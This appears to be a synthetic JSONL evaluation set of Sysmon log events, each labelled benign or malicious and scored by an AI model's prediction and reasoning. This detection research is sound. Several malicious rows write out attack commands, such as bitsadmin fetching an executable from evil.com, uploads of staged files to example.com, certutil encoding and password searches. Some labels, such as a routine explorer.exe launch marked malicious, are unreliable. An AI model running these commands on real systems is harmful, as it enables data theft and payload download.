configuration files, scripts, or documents.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:55", "UtcTime": "2020-05-01T22:57:55.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\bitsadmin.exe", "CommandLine": "bitsadmin /transfer logUpload /upload /priority normal C:\\Users\\Public\\Documents\\suspicious.log http://example.com/upload/log_receiver.php", "ProcessId": "2010", "ProcessGUID": "{6bbf237a-07da-5eac-07da-0000000007da}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1945", "ParentProcessGUID": "{6bbf237a-0799-5eac-0799-000000000799}", "ParentCommandLine": "cmd.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:55] | PID=2010 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\bitsadmin.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=bitsadmin /transfer logUpload /upload /priority normal C:\\Users\\Public\\Documents\\suspicious.log http://example.com/upload/log_receiver.php", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Bitsadmin being used to upload a suspicious log file from a public directory to an external server - classic data exfiltration technique using a legitimate Windows tool.", "confidence": "high", "attack_technique": "file_exfiltration"}}
{"EventID": 1, "EventTime": "2025-10-10 08:02:20", "UtcTime": "2025-10-10T08:02:20.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "ProcessId": "2008", "ProcessGUID": "{12345678-1234-5678-1234-567812340011}", "ParentImage": "C:\\Windows\\System32\\services.exe", "ParentProcessId": "500", "ParentProcessGUID": "{12345678-1234-5678-1234-567812340012}", "ParentCommandLine": "C:\\Windows\\System32\\services.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "System", "CurrentDirectory": "C:\\Windows\\System32", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:02:20] | PID=2008 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\svchost.exe | Parent=C:\\Windows\\System32\\services.exe | CMD=C:\\Windows\\System32\\svchost.exe -k netsvcs", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Legitimate svchost.exe process running as SYSTEM with standard netsvcs parameter, spawned by services.exe which is the expected parent process for Windows service hosting.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:04", "UtcTime": "2020-05-01T22:56:04.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\explorer.exe", "ProcessId": "1234", "ProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "ParentProcessId": "123", "ParentProcessGUID": "{6bbf237a-007b-5eac-007b-00000000007b}", "ParentCommandLine": "C:\\Windows\\System32\\userinit.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:04] | PID=1234 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\explorer.exe | Parent=C:\\Windows\\System32\\userinit.exe | CMD=C:\\Windows\\explorer.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Windows Explorer launched by userinit.exe under NETWORK SERVICE account is a standard Windows logon process sequence that occurs during user session initialization.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:30", "UtcTime": "2020-05-01T22:57:30.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\bitsadmin.exe", "CommandLine": "bitsadmin /transfer job1 /create /download /priority normal http://evil.com/file.exe C:\\temp\\file.exe", "ProcessId": "2112", "ProcessGUID": "{6bbf237a-0840-5eac-0840-000000000840}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "204", "ParentProcessGUID": "{6bbf237a-00cc-5eac-00cc-0000000000cc}", "ParentCommandLine": "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:30] | PID=2112 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\bitsadmin.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=bitsadmin /transfer job1 /create /download /priority normal http://evil.com/file.exe C:\\temp\\file.exe", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Bitsadmin downloading executable from suspicious domain (evil.com) to temp directory - classic living-off-the-land technique for malware download and potential command-and-control activity.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:12", "UtcTime": "2020-05-01T22:57:12.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -c Invoke-WebRequest -Uri http://example.com/upload/encoded.zip -Method POST -InFile C:\\Users\\Public\\Documents\\encoded.zip", "ProcessId": "1852", "ProcessGUID": "{6bbf237a-073c-5eac-073c-00000000073c}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "432", "ParentProcessGUID": "{6bbf237a-01b0-5eac-01b0-0000000001b0}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:12] | PID=1852 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\explorer.exe | CMD=powershell -c Invoke-WebRequest -Uri http://example.com/upload/encoded.zip -Method POST -InFile C:\\Users\\Public\\Documents\\encoded.zip", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell uploading a zip file from a public staging directory (C:\\Users\\Public\\Documents) to an external server via POST request - classic data exfiltration pattern. The NETWORK SERVICE account and explorer.exe parent process relationship is also suspicious.", "confidence": "high", "attack_technique": "file_exfiltration"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:20", "UtcTime": "2020-05-01T22:56:20.000Z", "Hostname": "NASHUA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\compact.exe", "CommandLine": "compact /c /s:C:\\Users\\pbeesly\\Documents\\ClientData", "ProcessId": "1256", "ProcessGUID": "{6bbf237a-04e8-5eac-04e8-0000000004e8}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1235", "ParentProcessGUID": "{6bbf237a-04d3-5eac-04d3-0000000004d3}", "ParentCommandLine": "cmd.exe /c C:\\ProgramData\\victim\\cod.3aka3.scr", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_staging", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:20] | PID=1256 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\compact.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=compact /c /s:C:\\Users\\pbeesly\\Documents\\ClientData", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Using compact.exe to compress files in a user's Documents folder (ClientData) is consistent with data staging behavior before exfiltration, especially when executed via cmd.exe.", "confidence": "medium", "attack_technique": "data_staging"}}
{"EventID": 1, "EventTime": "2025-10-20 14:55:30", "UtcTime": "2025-10-20T14:55:30.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\7-Zip\\7zFM.exe", "CommandLine": "\"C:\\Program Files\\7-Zip\\7zFM.exe\"", "ProcessId": "3456", "ProcessGUID": "{34506789-0abc-34f5-c678-648836396222}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{123e4567-e89b-12d3-a456-426614174000}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\Downloads", "LogonId": "0x12345", "_label": "benign", "_source": "llm", "prompt": "[2025-10-20 14:55:30] | PID=3456 | User=CORP\\jsmith | Image=C:\\Program Files\\7-Zip\\7zFM.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\7-Zip\\7zFM.exe\"", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User launching 7-Zip file manager from Windows Explorer - standard file compression/decompression activity with normal parent-child relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 15, "EventTime": "2025-10-10 08:03:40", "UtcTime": "2025-10-10T08:03:40.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "1678", "ProcessGUID": "{38caef33-b1c7-0a66-1c00-000000001000}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Windows\\System32\\msedge.exe", "TargetFilename": "C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000001", "CreationUtcTime": "2025-10-10T08:03:40.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:40] | PID=1678 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\msedge.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Edge browser process running under a standard corporate user account - normal web browsing activity with no suspicious command-line parameters or context.", "confidence": "high", "attack_technique": ""}}
{"EventID": 3, "EventTime": "2025-10-10 08:03:10", "UtcTime": "2025-10-10T08:03:10.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Git\\bin\\bash.exe", "ProcessId": "2010", "ProcessGUID": "{12345678-1234-5678-1234-567812340014}", "User": "WORKSTATION\\user", "IntegrityLevel": "Medium", "SourcePort": "50002", "DestinationIp": "142.250.185.110", "DestinationPort": "443", "DestinationHostname": "www.google.com", "Protocol": "tcp", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:10] | PID=2010 | User=WORKSTATION\\user | Image=C:\\Program Files\\Git\\bin\\bash.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Git Bash executable running under a standard user account - legitimate development tool usage with no suspicious command-line arguments or context.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:55:58", "UtcTime": "2020-05-01T22:55:58.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\explorer.exe", "ProcessId": "1564", "ProcessGUID": "{6bbf237a-061c-5eac-061c-00000000061c}", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "ParentProcessId": "820", "ParentProcessGUID": "{6bbf237a-0334-5eac-0334-000000000334}", "ParentCommandLine": "C:\\Windows\\System32\\userinit.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "persistence", "_source": "llm_scenario", "prompt": "[2020-05-01 22:55:58] | PID=1564 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\explorer.exe | Parent=C:\\Windows\\System32\\userinit.exe | CMD=C:\\Windows\\explorer.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Windows Explorer launched by userinit.exe is a standard Windows logon process that occurs during normal user session initialization.", "confidence": "high", "attack_technique": ""}}
{"EventID": 11, "EventTime": "2025-10-10 08:02:30", "UtcTime": "2025-10-10T08:02:30.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "6789", "ProcessGUID": "{01339e83-1769-5eb8-1000-000000000f00}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE", "TargetFilename": "C:\\Users\\jsmith\\Documents\\Spreadsheet.xlsx", "CreationUtcTime": "2025-10-10T08:02:30.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:02:30] | PID=6789 | User=CORP\\jsmith | Image=C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Excel executable running from legitimate Office installation directory - standard business application usage by domain user.", "confidence": "high", "attack_technique": ""}}
{"EventID": 11, "EventTime": "2025-10-10 08:03:20", "UtcTime": "2025-10-10T08:03:20.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "2012", "ProcessGUID": "{7d1e3377-f50b-4e0a-2000-000000001400}", "User": "NT AUTHORITY\\SYSTEM", "IntegrityLevel": "Medium", "Image": "C:\\Windows\\System32\\wbem\\wmiprvse.exe", "TargetFilename": "C:\\Windows\\Logs\\WMI\\wmi.log", "CreationUtcTime": "2025-10-10T08:03:20.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:20] | PID=2012 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\wbem\\wmiprvse.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "WMI Provider Host (wmiprvse.exe) running as SYSTEM is a legitimate Windows service that executes WMI queries and operations. Without additional context showing suspicious command-line arguments or network activity, this appears to be normal system activity.", "confidence": "medium", "attack_technique": ""}}
{"EventID": 3, "EventTime": "2025-10-15 08:22:20", "UtcTime": "2025-10-15T08:22:20.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\WindowsApps\\Microsoft.Photos_2024.11050.25004.0_x64__8wekyb3d8bbwe\\Microsoft.Photos.exe", "ProcessId": "2345", "ProcessGUID": "{234f5678-f90c-23e4-b567-537725285111}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "SourcePort": "49152", "DestinationIp": "192.168.1.100", "DestinationPort": "80", "DestinationHostname": "", "Protocol": "TCP", "_label": "benign", "_source": "llm", "prompt": "[2025-10-15 08:22:20] | PID=2345 | User=CORP\\jsmith | Image=C:\\Program Files\\WindowsApps\\Microsoft.Photos_2024.11050.25004.0_x64__8wekyb3d8bbwe\\Microsoft.Photos.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Photos application launched by a domain user - standard Windows application usage for viewing images.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:25", "UtcTime": "2020-05-01T22:57:25.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "Get-Content C:\\Users\\DMEVALS\\pbeesly\\Desktop\\config.ini | Select-String -Pattern \"password\"", "ProcessId": "1240", "ProcessGUID": "{6bbf237a-04d8-5eac-04d8-0000000004d8}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1239", "ParentProcessGUID": "{6bbf237a-04d7-5eac-04d7-0000000004d7}", "ParentCommandLine": "findstr /sil \"credentials\" C:\\Users\\DMEVALS\\pbeesly\\Documents\\*.*", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:25] | PID=1240 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=Get-Content C:\\Users\\DMEVALS\\pbeesly\\Desktop\\config.ini | Select-String -Pattern \"password\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell command searching for password strings in a configuration file - indicative of credential discovery activity to harvest stored credentials.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:48", "UtcTime": "2020-05-01T22:56:48.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c powershell Invoke-Command -ComputerName DESKTOP-TARGET -ScriptBlock {Get-Process}", "ProcessId": "1284", "ProcessGUID": "{6bbf237a-0504-5eac-0504-000000000504}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1024", "ParentProcessGUID": "{6bbf237a-0400-5eac-0400-000000000400}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:48] | PID=1284 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c powershell Invoke-Command -ComputerName DESKTOP-TARGET -ScriptBlock {Get-Process}", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "SYSTEM account executing PowerShell remote command via cmd.exe spawned from explorer.exe - highly suspicious parent-child relationship indicating potential lateral movement or remote execution abuse.", "confidence": "high", "attack_technique": "remote_execution"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:03", "UtcTime": "2020-05-01T22:56:03.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -encode C:\\temp\\data.cab C:\\temp\\encoded.txt", "ProcessId": "2856", "ProcessGUID": "{6bbf237a-0b28-5eac-0b28-000000000b28}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1524", "ParentProcessGUID": "{6bbf237a-05f4-5eac-05f4-0000000005f4}", "ParentCommandLine": "cmd.exe /c copy C:\\Users\\Public\\Documents\\sensitive_data.txt C:\\temp\\data.cab", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\SYSTEM\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:03] | PID=2856 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\certutil.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=certutil.exe -encode C:\\temp\\data.cab C:\\temp\\encoded.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Certutil being used to encode a CAB archive file, likely for data staging/obfuscation before exfiltration. Running as SYSTEM from cmd.exe makes this highly suspicious as certutil is commonly abused for LOTL attacks.", "confidence": "high", "attack_technique": "data_staging"}}
